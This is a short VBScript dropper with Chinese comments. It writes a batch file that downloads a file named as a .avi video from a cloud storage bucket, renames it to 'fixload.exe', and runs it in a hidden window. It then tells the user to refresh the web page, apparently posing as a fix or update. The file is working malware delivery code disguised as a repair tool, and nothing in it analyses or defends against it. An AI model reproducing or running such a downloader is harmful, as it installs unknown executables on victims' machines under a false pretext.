Dim fso, cmdFile, cmdContent, shell

' 创建 FileSystemObject
Set fso = CreateObject("Scripting.FileSystemObject")

' 定义 cmd 文件路径
cmdFile = fso.GetAbsolutePathName(".") & "\updat1.cmd"

' 定义 cmd 文件内容
cmdContent = "@echo off" & vbCrLf & _
             "echo 正在下载文件..." & vbCrLf & _
             "curl -o load.avi https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi" & vbCrLf & _
             "if %errorlevel% neq 0 (" & vbCrLf & _
             "    echo 下载失败!" & vbCrLf & _
             "    exit /b" & vbCrLf & _
             ")" & vbCrLf & _
             "echo 下载完成，正在重命名..." & vbCrLf & _
             "ren load.avi fixload.exe" & vbCrLf & _
             "echo 正在执行 fixload.exe..." & vbCrLf & _
             "start /wait fixload.exe" & vbCrLf & _
             "echo 修复完成!"

' 创建并写入 cmd 文件
With fso.CreateTextFile(cmdFile, True)
    .WriteLine cmdContent
    .Close
End With

' 创建 Shell 对象并执行 cmd 文件
Set shell = CreateObject("WScript.Shell")
shell.Run cmdFile, 0, True

' 提示用户
MsgBox "刷新网页即可。", vbInformation, "提示"
